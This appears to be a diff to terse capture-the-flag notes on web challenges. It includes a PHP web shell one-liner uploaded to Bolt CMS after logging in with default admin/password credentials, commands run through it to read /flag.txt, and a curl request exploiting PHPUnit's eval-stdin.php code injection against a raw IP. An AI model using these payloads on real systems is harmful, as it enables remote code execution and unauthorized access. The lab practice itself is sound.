@@ -1,9 +1,12 @@
 1. Bolt:
 
 <?php echo system($_GET['cmd']);?>
-
-paroli:password
-user:admin
+Find source. For this add "view-source:" at the very start of the link.
+Add /bolt/login to the link at the end, which takes you to the login screen.
+Wild-guess the password, combo is admin/password. Upload this code as a .html:
+<?php echo system($_GET[‘cmd’]);?>
+Afterwards, rename it to php. Go into the file, and start searching. First add
+cmd=id; then cmd=ls%20-l; lastly cmd=cat%20/flag.txt
 
 2.
 
@@ -28,6 +31,12 @@ Use the following:
 the command: curl -X POST
 35.242.218.207:32111//vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php --data
 "<?php system('ls -la');?>"      php 5.6.2
+
+Use dirsearch:
+./dirsearch.py -u http://url -w ./db/dicc.txt
+Find composer.json, realise that the version 5.6.2 is vulnerable to code injection
+Open Burp, use code injection to run:
+<?php system('cat/flag.txt')?>
 
 5. non diff backdoor:
 
